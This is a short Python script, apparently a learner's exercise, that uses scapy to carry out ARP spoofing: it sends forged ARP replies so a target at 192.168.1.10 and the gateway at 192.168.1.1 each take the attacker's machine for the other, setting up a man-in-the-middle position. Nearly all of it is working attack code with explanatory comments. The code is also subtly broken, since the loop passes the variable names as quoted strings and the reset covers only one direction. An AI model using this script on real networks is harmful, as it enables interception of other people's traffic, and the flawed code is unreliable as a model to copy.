#!/usr/bin/env python3
import sys
import time
import scapy.all as scapy

#to create arp requet , op  == 2
#pdst = ip of target 
#hwdst = mac of target 
#forging to victim to believe that this request is from router but not from attacker.
# packet = scapy.ARP(op=2 ,pdst="192.168.1.11" ,hwdst="64:5a:04:0c:64:5e", psrc="192.168.1.1" )
# ARP is at 28:cd:c4:f4:de:b9 says 192.168.1.1 attacker mac have router's ip
# sending this packet means , target machine will think that attacker machine is router


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # to create packet
    arp_request_broadcast = broadcast / arp_request  # combination of two packet
    ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # for sending the dest packet
    # ans[0] == element[1]
    return ans[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(source_ip,destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet1 = scapy.ARP(op=2 , pdst=source_ip , hwdst=source_mac , psrc=destination_ip , hwsrc=destination_mac)
    scapy.send(packet1)



# if hwsrc is not mentioned in the packet , it will take the mac add of attacker machine which will fool the victim
# so mentioning hwsrc will take the mac of what we given in the input as argument of function
sent_packets = 0

target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"

try:
    while True:
        spoof("target_ip", "gateway_ip")
        spoof("gateway_ip", "target_ip")
        sent_packets = sent_packets + 2
        # print("Packent Sent : " + str(sent_packets)),
        # sys.stdout.flush()
        print("\rPackent Sent : " + str(sent_packets) , end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("Detected ctrlc and reseting ARP tables....")
    restore("target_ip", "gateway_ip")